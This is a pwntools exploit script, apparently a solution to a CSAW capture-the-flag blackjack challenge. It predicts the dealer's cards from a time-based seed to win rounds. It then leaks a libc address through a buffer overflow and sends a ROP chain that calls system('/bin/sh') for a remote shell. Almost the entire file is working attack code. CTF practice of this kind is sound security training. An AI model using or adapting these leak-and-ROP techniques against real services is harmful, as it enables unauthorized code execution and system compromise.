from pwn import *
from time import time


context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./chal')
p = remote("0.0.0.0",9999)
# p = remote("when-to-h1t.chal.csaw.io",12345)

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

ct = 0 
cards = []
def get_y(pre):
    global ct
    ru("Your total is ")
    c = int(p.readline()[:-2])
    # print(ct,cards[ct],c-pre)
    if(cards[ct]):
        assert(cards[ct] == c-pre)
    ct+=1
    return c
def get_d(pre):
    global ct
    ru('The dealer has a total of ')
    c = int(p.readline()[:-2])
    
    # print(ct,cards[ct],c-pre)
    if(cards[ct]):
        assert(cards[ct] == c-pre)
    ct+=1
    return c
def AAA(y,n):
    if n != 0:
        return n
    elif(y>10):
        return 1
    else:
        return 11
def play():
    global ct
    sla("Choice: \n","1")
    y = get_y(0)
    d = get_d(0)
    while(y+AAA(y,cards[ct])<=21):
        sla(" stay.\n","h")
        y = get_y(y)
        # log.warning(str(y))
        if y == 21:
            return 1
        
        d = get_d(d)
        # log.warning(str(d))
        p.readline()
        prompt = p.readline()
        if b"You lose." in prompt:
            return 0
        elif b"You win!" in prompt or b"You Win!" in prompt:
            return 1
    sla(" stay.\n","s")

    while(1):
        d= get_d(d)
        if d >=17:
            break
    
    
    p.readline()
    prompt= p.readline()

    if b"You lose." in prompt:
        return 0
    elif b"You win!" in prompt or b'You Win!' in prompt:
        return 1
    else:
        print("Weird")
        exit(1)
def prepare_sol(seed):
    ppp = process("./sol")
    ppp.sendline(str(seed).encode())
    ppp.read()
    ppp.close()
    with open("./xxx") as f:
        ddd = f.readlines()
    return [int(x) for x in ddd]
sa("\n\n\n","Y")
cards = prepare_sol(int(time()))
# print(cards[:400])
points = 0
for x in range(20):
    # print(f"Round {x} -> {points}")
    points+= play()
log.warning(str(points))

if points<12:
    exit(1)
context.log_level='debug'
# input()
off = 0x38
sa("?\n",b"A"*off)
ru(b"A"*off)

base = u64(ru("!")[:-1]+b'\0\0')-0x21d4a0+0x5000

# gdb.attach(p,'''
# b *score_report+929
# c
# python if(0!=((int(gdb.parse_and_eval("$rsp")+(0x7ffc65379978-0x7ffc65379570))&0xff00)>>0x8)):exit(1)
# ''')
#
ret = base+0x0000000000022679
rdi = base+0x0000000000023b6a
system = 0x52290+base
sh = 0x1b45bd+base
log.warning(hex(base))
sa("?\n",b"A"*0x333+b'\0'*5+p64(ret)*((0x100-0x38-0x20)//8)+flat([rdi,sh,system,0xdeadbeef]))
sa(")\n",b'N')

p.sendline("pwd")
xxx = p.readline()
if b""==xxx or b"timeout" in xxx or b"egmentation fault" in xxx:
    p.close()
else:
    p.interactive()
